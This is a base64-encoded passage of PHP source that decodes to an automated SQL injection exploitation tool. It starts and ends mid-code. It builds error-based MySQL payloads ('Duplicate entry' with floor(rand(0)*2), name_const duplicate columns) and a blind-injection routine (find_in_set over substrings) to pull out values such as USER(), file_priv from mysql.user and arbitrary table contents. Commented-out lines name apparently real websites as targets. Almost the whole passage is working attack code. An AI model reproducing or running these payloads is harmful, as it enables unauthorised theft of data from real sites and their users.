OwoJCQkJLy8JCQlkaWUoKTsKCQkJCSRsZW5fc3Ryb2tpID0gJGFyclsxXVswXTsKCQkJCSRjb3VudF96YXByID0gY2VpbCgkYXJyWzFdWzBdLyR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQpOwoJCQkJCgkJCQkvLyBlY2hvICR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQ7CgkJCQkvL2RpZSgpOwoJCQkJLy8vLwoJCQkJJHN0cm9rYSA9ICcnOwoJCQkKCQkJCSRzdGFydCA9IDE7CgkJCQoJCQkKCQkJCSRmaW4gICA9ICR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQ7CgkJCQoJCQkvLwllY2hvICRjb3VudF96YXByLic8YnIvPic7CgkJCQkKCQkJZm9yKCRpPTE7JGk8PSRjb3VudF96YXByOyRpKyspewoKCQkJCS8vZWNobyAkc3RhcnQuJzxicj4nOwoJCQkJCgkJCQkkdXJsID0gJHRoaXMtPnVybC4nMTk5OTk5OTk5OTknLiR0aGlzLT5nZXRfYnlfZXJyb3IuJytvcisoc2VsZWN0K2NvdW50KCopZnJvbShzZWxlY3QrMSt1bmlvbitzZWxlY3QrMit1bmlvbitzZWxlY3QrMyl4K2dyb3VwK2J5K2NvbmNhdChtaWQoKHNlbGVjdCsnLiR2YWx1ZS4nKycuJGZyb20uJysnLiR3aGVyZS4nK2xpbWl0KycuJGxpbWl0LicpLCcuJHN0YXJ0LicsJy4kZmluLicpLGZsb29yKHJhbmQoMCkqMikpKSstLSsnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJz0nLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnOwoJCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJCQkJCgkJCQkvL2VjaG8gJHVybC4nPGJyLz4nOwoJCQkJLy9lY2hvICRmaWxlLic8YnIvPjxici8+JzsKCQkJCQoJCQkJcHJlZ19tYXRjaF9hbGwoIn5cRHVwbGljYXRlIGVudHJ5IFwnKC4qPylcJyBmb3Iga2V5fmlzIiwkZmlsZSwkYXJyKTsKCgkJCQkkc3Ryb2thLj0gQCRhcnJbMV1bMF07CgkJCQkkc3RhcnQgPSAkc3RhcnQgKyAkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0OwoJCQkJJGZpbiAgID0gJGZpbiArICR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQ7CgkJCQkKCQkJCgkJCQkvL2VjaG8gJGkuJzxici8+JzsKCQkJCgkJCX0KCQkJLy9kaWUoKTsKCQkJJHN0cm9rYSA9IHN1YnN0cigkc3Ryb2thLCAwLCAtMSk7CgkJCQkKCQkJCS8vLy8KCQkJCQoJCQkJJG5ld1skdmFsdWVdID0gJHN0cm9rYTsKCgkJCQkKCQkJfQoJCQkJcmV0dXJuICRuZXc7CgkJCQoJCX1lbHNlewoKCQkJJHVybCA9ICR0aGlzLT51cmwuJzE5OTk5OTk5OTk5Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrb3IrKHNlbGVjdCtjb3VudCgqKWZyb20oc2VsZWN0KzErdW5pb24rc2VsZWN0KzIrdW5pb24rc2VsZWN0KzMpeCtncm91cCtieStjb25jYXQoKHNlbGVjdCtsZW5ndGgoJy4kcG9sZS4nKSsnLiRmcm9tLicrJy4kd2hlcmUuJytsaW1pdCsnLiRsaW1pdC4nKSxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCJ8IikuJyksZmxvb3IocmFuZCgwKSoyKSkpKy0tKycuJHRoaXMtPmdldF9ieV9lcnJvci4neCcuJHRoaXMtPmdldF9ieV9lcnJvci4nPScuJHRoaXMtPmdldF9ieV9lcnJvci4neCc7CgkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQlwcmVnX21hdGNoX2FsbCgiflxEdXBsaWNhdGUgZW50cnkgXCcoLio/KVx8fmlzIiwkZmlsZSwkYXJyKTsKCgkJCSRsZW5fc3Ryb2tpID0gJGFyclsxXVswXTsKCQkJJGNvdW50X3phcHIgPSBjZWlsKCRhcnJbMV1bMF0vJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCk7CgkJCQoJCQkvL2VjaG8gJGNvdW50X3phcHI7CgkJCQoJCQkkc3Ryb2thID0gJyc7CgkJCQoJCQkkc3RhcnQgPSAxOwoJCQkkZmluICAgPSAkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0OwoJCQkKCQkJZm9yKCRpPTE7JGk8PSRjb3VudF96YXByOyRpKyspewoJCQkJCgkJCQkKCQkJCSR1cmwgPSAkdGhpcy0+dXJsLicxOTk5OTk5OTk5OScuJHRoaXMtPmdldF9ieV9lcnJvci4nK29yKyhzZWxlY3QrY291bnQoKilmcm9tKHNlbGVjdCsxK3VuaW9uK3NlbGVjdCsyK3VuaW9uK3NlbGVjdCszKXgrZ3JvdXArYnkrY29uY2F0KG1pZCgoc2VsZWN0KycuJHBvbGUuJysnLiRmcm9tLicrJy4kd2hlcmUuJytsaW1pdCsnLiRsaW1pdC4nKSwnLiRzdGFydC4nLCcuJGZpbi4nKSxmbG9vcihyYW5kKDApKjIpKSkrLS0rJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLid4Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLic9Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLid4JzsKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQkJcHJlZ19tYXRjaF9hbGwoIn5cRHVwbGljYXRlIGVudHJ5IFwnKC4qPylcJyBmb3Iga2V5fiIsJGZpbGUsJGFycik7CgoJCQkJJHN0cm9rYS49ICRhcnJbMV1bMF07CgkJCQkkc3RhcnQrPSAkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0OwoJCQkJJGZpbiAgKz0gJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodDsKCQkJCQoJCQkKCQkJCS8vZWNobyAkaS4nPGJyLz4nOwoJCQkKCQkJfQoJCQkKCQkJJHN0cm9rYSA9IHN1YnN0cigkc3Ryb2thLCAwLCAtMSk7CgkJCQoJCQlyZXR1cm4gYXJyYXkoJHBvbGU9PiRzdHJva2EpOwoJCQkKCQkJCgkJfQoJCQoJCQoJCgl9CgkKCWZ1bmN0aW9uIG15c3FHZXRWYWx1ZUJ5RXJyb3JORVcoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9Jycpey8v0LTQvtGH0LXRgNC90Y/RjwoJCQoJCSRsaW1pdCA9ICRsaW1pdC4nLDEnOwoJCQoJCWlmKCR0YWJsZSE9PScnKXsKCQkJCgkJCSRmcm9tID0gJ0ZST00rJy4kYmQuJy4nLiR0YWJsZS4nJzsKCQkJCgkJfWVsc2V7CgkJCSRmcm9tID0gJyc7CgkJfQoJCQoJCWlmKCR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQ9PTApewoJCQkJCQkJCgkJCQoJCQkKCQkJJHVybCA9ICR0aGlzLT51cmwuJHRoaXMtPmdldF9ieV9lcnJvci4nK29yKygxLDIpPShzZWxlY3QqZnJvbShzZWxlY3QlMjBuYW1lX2NvbnN0KENIQVIoMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDkpLDEpLG5hbWVfY29uc3QoQ0hBUigxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSwxMjAsNDksMTIwLDQ5LDEyMCw0OSksMSkpYSknOwoJCQkKCQkvLwllY2hvICR1cmw7CgkJCQoJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsKTsKCQkJLy9lY2hvICRmaWxlOwoJCQkvL2RpZSgpOwoJCQkJCgkJCXByZWdfbWF0Y2hfYWxsKCJ+XER1cGxpY2F0ZSBjb2x1bW4gbmFtZSBcJyguKj8pXCd+aXMiLCRmaWxlLCRhcnIpOwoJCQkvLy9EdXBsaWNhdGUgZW50cnkgJ3gxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDEnIGZvciBrZXkgMQoJCQkkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0ID0gc3Vic3RyX2NvdW50KCRhcnJbMV1bMF0sICd4MScpOwoJCQkkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0ID0gJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCoyOwoJCQkKCQkJLy9lY2hvICR0aGlzLT5nZXRfYnlfZXJyb3JfbGVnaHQ7CgkJCS8vZGllKCk7CgkJCS8vZWNobyAkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0OwoJCQkvL2RpZSgkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0KTsKCQl9CgkJCgkJLy9wcmludF9yKCRwb2xlKTsKCQkKCQkvL9Cd0YPQttC90LAg0L/RgNC+0LLQtdGA0LrQsCDQvdCwIGNvbmNhdCDQsiDQt9Cw0L/RgNC+0YHQtQoJCQoJCS8v0KPQt9C90LDRgtGMINC60LDQutCw0Y8g0LTQu9C40L3QvQoJCQoJCQoJCQoJCQoJCQoJCWlmKGlzX2FycmF5KCRwb2xlKSl7CgkJCQoJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsdWUpewoKCQkJCQkJCgkJCQkkcXUgPSAnKHNlbGVjdCsnLiR2YWx1ZS4nKycuJGZyb20uJysnLiR3aGVyZS4nK2xpbWl0KycuJGxpbWl0LicpJzsKCQkJCgkJCQkkdXJsID0gJHRoaXMtPnVybC4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrb3IrKDEsMik9KHNlbGVjdCpmcm9tKHNlbGVjdCUyMG5hbWVfY29uc3QoJy4kcXUuJywxKSxuYW1lX2NvbnN0KCcuJHF1LicsMSkrJy4kZnJvbSAuJysnLiR3aGVyZS4nK2xpbWl0KycuJGxpbWl0LicpYSkrQU5EKycuJHRoaXMtPmdldF9ieV9lcnJvci4neCcuJHRoaXMtPmdldF9ieV9lcnJvci4nPScuJHRoaXMtPmdldF9ieV9lcnJvci4neCc7CgkJCQkKCQkJCQoJCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJCQkvL2VjaG8gJHVybC4nPGJyLz4nOwoJCQkvLwllY2hvICRmaWxlLic8YnIvPi0tLTxici8+JzsKCQkJCXByZWdfbWF0Y2hfYWxsKCJ+XER1cGxpY2F0ZSBjb2x1bW4gbmFtZSBcJyguKj8pXCd+IiwkZmlsZSwkYXJyKTsKCgkJCQkkc3Ryb2thID0gQCRhcnJbMV1bMF07CgoJCQkJJG5ld1skcG9sZV0gPSAkc3Ryb2thOwoJCQkKCQkJfQoKCQkJCS8vLy8KCQkJCQoJCQkJJG5ld1skcG9sZV0gPSAkc3Ryb2thOwoKCQkJCXJldHVybiAkbmV3OwoJCQkJCgkJCQoJCX1lbHNlewoKCQkKCgkJCQkKCQkJCSRxdSA9ICcoc2VsZWN0KycuJHBvbGUuJysnLiRmcm9tLicrJy4kd2hlcmUuJytsaW1pdCsnLiRsaW1pdC4nKSc7CgkJCQoJCQkJJHVybCA9ICR0aGlzLT51cmwuJHRoaXMtPmdldF9ieV9lcnJvci4nK29yKygxLDIpPShzZWxlY3QqZnJvbShzZWxlY3QlMjBuYW1lX2NvbnN0KCcuJHF1LicsMSksbmFtZV9jb25zdCgnLiRxdS4nLDEpKycuJGZyb20gLicrJy4kd2hlcmUuJytsaW1pdCsnLiRsaW1pdC4nKWEpK0FORCsnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJz0nLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnOwoJCQkJCgkJCQkKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQkvLwllY2hvICR1cmwuJzxici8+JzsKCQkJLy8JZWNobyAkZmlsZS4nPGJyLz4tLS08YnIvPic7CgkJCQlwcmVnX21hdGNoX2FsbCgiflxEdXBsaWNhdGUgY29sdW1uIG5hbWUgXCcoLio/KVwnfiIsJGZpbGUsJGFycik7CgoJCQkJJHN0cm9rYSA9IEAkYXJyWzFdWzBdOwoKCQkJCXJldHVybiBhcnJheSgkcG9sZT0+JHN0cm9rYSk7CgkJCQoJCQkKCQl9CgkJCgkJCgkKCX0KCQoJZnVuY3Rpb24gbXlzcWxHZXRCeU9yZGVyKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0PTAsJG9yZGVyPWFycmF5KCksJHdoZXJlPScnKXsvL9C00L7Rh9C10YDQvdGP0Y8KCQkKCQkkbGltaXQgPSAkbGltaXQuJywxJzsKCQkKCQlpZigkdGFibGUhPT0nJyl7CgkJCQoJCQkkZnJvbSA9ICdGUk9NKycuJGJkLicuJy4kdGFibGUuJyc7CgkJCQoJCX1lbHNlewoJCQkkZnJvbSA9ICcnOwoJCX0KCQkKCgkKCQkvL2lkK2FuZCUyOHNlbGVjdCsxK2Zyb20lMjhzZWxlY3QrY291bnQlMjgqJTI5JTJDY29uY2F0JTI4JTI4c2VsZWN0KyUyOHNlbGVjdCslMjhTRUxFQ1QrZGlzdGluY3QrY29uY2F0JTI4MHg3ZSUyQzB4MjclMkNmaWxlX3ByaXYlMkMweDI3JTJDMHg3ZSUyOStGUk9NK215c3FsLnVzZXIrTElNSVQrOSUyQzElMjklMjkrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2xpbWl0KzAlMkMxJTI5JTJDZmxvb3IlMjhyYW5kJTI4MCUyOSoyJTI5JTI5eCtmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrZ3JvdXArYnkreCUyOWElMjkrYW5kKzElM0QxCQoJCQkJCgkJaWYoaXNfYXJyYXkoJHBvbGUpKXsKCQkJCgkJCQoJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsKXsKCgkJCQkkdXJsID0gJHRoaXMtPnVybC4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrYW5kJTI4c2VsZWN0KzErZnJvbSUyOHNlbGVjdCtjb3VudCUyOColMjklMkNjb25jYXQlMjglMjhzZWxlY3QrJTI4c2VsZWN0KyUyOFNFTEVDVCtkaXN0aW5jdCtjb25jYXQlMjgweDdlJTJDMHgyNyUyQycuJHZhbC4nJTJDMHgyNyUyQzB4N2UlMjkrJy4kZnJvbS4nKycuJHdoZXJlLicrTElNSVQrJy4kbGltaXQuJyUyOSUyOStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCUyQzElMjklMkNmbG9vciUyOHJhbmQlMjgwJTI5KjIlMjklMjl4K2Zyb20raW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcytncm91cCtieSt4JTI5YSUyOSthbmQrJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicxJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLiclM0QnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJzEnOwoKCQkJLy8JZWNobyAkdXJsLic8YnIvPic7CgkJCQkKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQoJCQkJcHJlZ19tYXRjaF9hbGwoIn5cJyguKj8pXCcgZm9yIGtleX4iLCRmaWxlLCRhcnIpOwoJCQoJCQkJJGFyclsxXVswXSA9IHN0cl9yZXBsYWNlKCInfjEiLCcnLCRhcnJbMV1bMF0pOwoJCQkJLy8kdGhpcy0+ZCgkYXJyLCckYXJyIDEnKTsKCQkJCSRuZXdbJHZhbF0gPSAkYXJyWzFdWzBdOwoJCQkJCQoJCQkJCgkJCX0KCQkJCgkJCXJldHVybiAkbmV3OwoJCQkKCQl9ZWxzZQoJCXsKCgkJCSR1cmwgPSAkdGhpcy0+dXJsLiR0aGlzLT5nZXRfYnlfZXJyb3IuJythbmQlMjhzZWxlY3QrMStmcm9tJTI4c2VsZWN0K2NvdW50JTI4KiUyOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCUyOCcuJHBvbGUuJyUyQzB4MjclMkMweDdlJTI5KycuJGZyb20uJysnLiR3aGVyZS4nK0xJTUlUKycuJGxpbWl0LiclMjklMjkrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2xpbWl0KzAlMkMxJTI5JTJDZmxvb3IlMjhyYW5kJTI4MCUyOSoyJTI5JTI5eCtmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrZ3JvdXArYnkreCUyOWElMjkrYW5kKycuJHRoaXMtPmdldF9ieV9lcnJvci4nMScuJHRoaXMtPmdldF9ieV9lcnJvci4nJTNEJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicxJzsKCQkKCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJCS8vZWNobyAkZmlsZTsKCQkKCQkJcHJlZ19tYXRjaF9hbGwoIn5cJyguKj8pXCcgZm9yIGtleX4iLCRmaWxlLCRhcnIpOwoJCQkkYXJyWzFdWzBdID0gc3RyX3JlcGxhY2UoIid+MSIsJycsJGFyclsxXVswXSk7CgkJCQoJCQkvLyR0aGlzLT5kKCRhcnIsJyRhcnIgMicpOwoJCQlyZXR1cm4gYXJyYXkoJHBvbGU9PiRhcnJbMV1bMF0pOwoJCQkKCQl9CQoKCQlyZXR1cm4gZmFsc2U7Cgl9CgkKCQoJIAoJCgkKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vQkxJTkQvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCQoJcHVibGljIGZ1bmN0aW9uIHNlbmRfeHBsKCR1cmwsICR4cGwpewoJCQlyZXR1cm4gJHRoaXMtPmNvbnRlbnQoJHVybC4keHBsKTsKCQl9CgoJcHVibGljIGZ1bmN0aW9uIGNvbnRlbnQoJHVybCl7IC8vdGh4ICBFbGVrdAoJCQoJCSR0aW1lb3V0ID0gMzA7CgoJCSRoPUBwYXJzZV91cmwoJHVybCk7CgkJLy9lY2hvICR1cmwuIlxyXG4iOwoKCQkkdXJsID0gdHJpbSgkdXJsKTsKCQkKCQlpZihleHRlbnNpb25fbG9hZGVkKCdjdXJsJykpCgkJewoJCQkvLyR0aGlzLT5kKCR1cmwsJ3VybCcpOwoJCQkkY2ggPSBjdXJsX2luaXQoKTsKCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0VOQ09ESU5HLCAnJyk7CgkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOwoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgJHRpbWVvdXQpOwoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOwoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDApOwoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfTUFYUkVESVJTLCAyKTsKCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CgkJCSRwYWdlID0gY3VybF9leGVjKCRjaCk7CgkJCWN1cmxfY2xvc2UoJGNoKTsKCQkJCgkJCS8vJHRoaXMtPmQoJHBhZ2UsJyRwYWdlJyk7CgkJCS8vZXhpdDsKCQkJCgkJCXJldHVybiAkcGFnZTsKCQl9CgoJCWVsc2VpZihleHRlbnNpb25fbG9hZGVkKCdzb2NrZXRzJykpCgkJewoJCQlpZihAc3RydG9sb3dlcihAJGhbJ3NjaGVtZSddKT09J2h0dHBzJykKCQkJIHsKCQkJCSBpZighQGV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkgcmV0dXJuOwoJCQkJICRoWydwb3J0J109NDQzOwoJCQkJICRmcCA9IEBmc29ja29wZW4oJ3NzbDovLycuQCRoWydob3N0J10sIEAkaFsncG9ydCddLCAkZXJybm8sICRlcnJzdHIsICR0aW1lb3V0KTtpZighJGZwKSByZXR1cm47CgkJCSB9CgkJCWVsc2UKCQkJIHsKCQkJCSAkaFsncG9ydCddPTgwOwoJCQkJICRmcCA9IEBmc29ja29wZW4oQCRoWydob3N0J10sIEAkaFsncG9ydCddLCAkZXJybm8sICRlcnJzdHIsICR0aW1lb3V0KTtpZighJGZwKSByZXR1cm47CgkJCSB9CgkJCSRzdHI9IkdFVCAiLkAkaFsncGF0aCddLic/Jy5AJGhbJ3F1ZXJ5J10uIiBIVFRQLzEuMFxyXG4iLgoJCQkJICJIb3N0OiAiLkAkaFsnaG9zdCddLiJcclxuIi4KCQkJCSAiXHJcbiI7CgkJCUBmcHV0cygkZnAsICRzdHIpOwoJCQkkcGFnZT0nJzsgd2hpbGUgKCFAZmVvZigkZnApKSB7JHBhZ2UuPUBmZ2V0cygkZnAsMTI4KTt9CgkJCUBmY2xvc2UgKCRmcCk7CgkJCS8vZGllKCRwYWdlKTsKCQkJcmV0dXJuICRwYWdlOwoJCX0KCgkJZWxzZWlmKCBpbl9hcnJheShAaW5pX2dldCgnYWxsb3dfdXJsX2ZvcGVuJyksYXJyYXkoJ09uJywnT04nLCcxJywnWScsJ1llcycsJ1lFUycpKQoJCQkmJgoJCQkoQCRoWydzY2hlbWUnXT09J2h0dHBzJz9AZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpOjEpCgkJICApCgkJewoJCQlAaW5pX2FsdGVyKCdkZWZhdWx0X3NvY2tldF90aW1lb3V0JywkdGltZW91dCk7CgkJCXJldHVybiBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7CgkJfQoJCWVsc2UgCgkJewoJCQkKCQkJcmV0dXJuO30KCX0JCgoJcHVibGljIGZ1bmN0aW9uIGFycigpewoJCS8vcmV0dXJuIGFycmF5X21lcmdlKHJhbmdlKCcwJywgJzknKSxyYW5nZSgnYScsICdmJykpOwoJCXJldHVybiByYW5nZSgnYScsICd6Jyk7Cgl9CgoJcHVibGljIGZ1bmN0aW9uIGJ1aWxkX3hwbCgkYXJyYXksICRwb3MpewoJCSR3aGF0X3RvX2ZpbmQgPSAkdGhpcy0+d2hhdF90b19maW5kOwoJCWZvcmVhY2ggKCRhcnJheSBhcyAkbGV0dGVyKQoJCXsKCQkJJHNldCAuPSAkbGV0dGVyLicsJzsKCQl9CgkJJHNldCA9IHN1YnN0cigkc2V0LCAwLCAtMSk7CgkJJHN0ciA9ICJmaW5kX2luX3NldChzdWJzdHJpbmcoKCR3aGF0X3RvX2ZpbmQpLCRwb3MsMSksJyRzZXQnKSAiOwoJCXJldHVybiAkc3RyOwoJfQoKCXB1YmxpYyBmdW5jdGlvbiBncmVwX2V4cGxvaXRlZCgkdXJsKXsKCgl9CgoJcHVibGljIGZ1bmN0aW9uIGJsaW5kKCR1cmwpewoJCgkKCQoJCgkkbGltaXQ9MDsgICAgICAvLyByb3cgbnVtYmVyCgkkZnJvbT0xOyAgICAgICAvLyBwYWdlcyBmcm9tCgkkYXJyYXkgPSAkdGhpcy0+YXJyKCk7IC8vIGEtejAtOQoJJHN5bWJvbHMgPSAzMjsKCS8vJHVybCA9ICdodHRwOi8vcHJvZHVtYXIuY29tL2VuL3Byb2R1Y3Rvc19pbnRlcl9jYXRlZ29yaWEucGhwP2lkMz0zOSZpZD0xNSZpZGQ9JzsKCS8vJHVybCA9ICdodHRwOi8vZGFpbHlqb3VybmFsaG9tZXMuY29tL2RldGFpbC5waHA/bWxzPSc7CgkvL2h0dHA6Ly90b3JpMy5jb20vcG9zdHMvaWRvZS11YWguZXMvZW4vaWRvZV9ub3RpY2lhcy5waHA/aWQ9MQoKCS8vJHdoYXRfdG9fZmluZCA9ICdzZWxlY3QrJy4kZmllbGQuJytmcm9tKycuJHRhYmxlLicrbGltaXQrJy4kbGltaXQuJywxJzsgLy8gc2VsZWN0IHF1ZXJ5CgoKCSR0aGlzLT53aGF0X3RvX2ZpbmQgPSAnVVNFUigpJzsKCQoJIAoJCQkKCWVjaG8gIkdlbmVyYXRpbmcgdGVtcGxhdGVzIjsKCQoJZm9yKCRpPTE7JGk8PWNvdW50KCRhcnJheSk7JGkrKykKCXsJCgkgZWNobyAiLiI7